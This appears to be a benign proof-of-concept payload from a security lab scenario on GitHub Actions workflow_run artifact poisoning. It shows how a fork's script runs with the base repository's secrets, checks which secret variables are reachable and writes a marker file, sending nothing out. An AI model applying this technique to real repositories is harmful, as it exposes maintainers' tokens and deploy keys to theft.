// attacks/11-workflow-run-poisoning/payload/comment.js
//
// Benign proof-of-concept for scenario 11. In the lab, a fork pull request
// adds a file like this to its branch under scripts/comment.js. The vulnerable
// `comment.yml` downloads the fork's build artifact and runs `node
// ./scripts/comment.js` in the base repo's privileged context, so THIS code
// executes with the base repo's GITHUB_TOKEN and secrets.
//
// A real attacker would exfiltrate those secrets or push to a protected
// branch. This PoC only PROVES the execution: it records which privileged
// values were in reach and writes a marker file. It sends nothing anywhere.

const fs = require("fs");

// Secrets the vulnerable job exposed to this step via env:. Their mere
// presence here is the finding — attacker code should never see them.
const reachable = ["GH_TOKEN", "DEPLOY_KEY", "GITHUB_TOKEN"].filter(
  (k) => typeof process.env[k] === "string" && process.env[k].length > 0,
);

const marker = {
  poc: "scenario-11-workflow_run-artifact-poisoning",
  executed: true,
  context: "privileged workflow_run handler (base repo)",
  secrets_in_reach: reachable,
  note: "benign lab PoC — no data left this runner",
};

fs.writeFileSync("poisoned.proof.json", JSON.stringify(marker, null, 2));
console.log("[poc] attacker-controlled artifact code executed in privileged context");
console.log("[poc] secrets reachable from here:", reachable.join(", ") || "(none)");
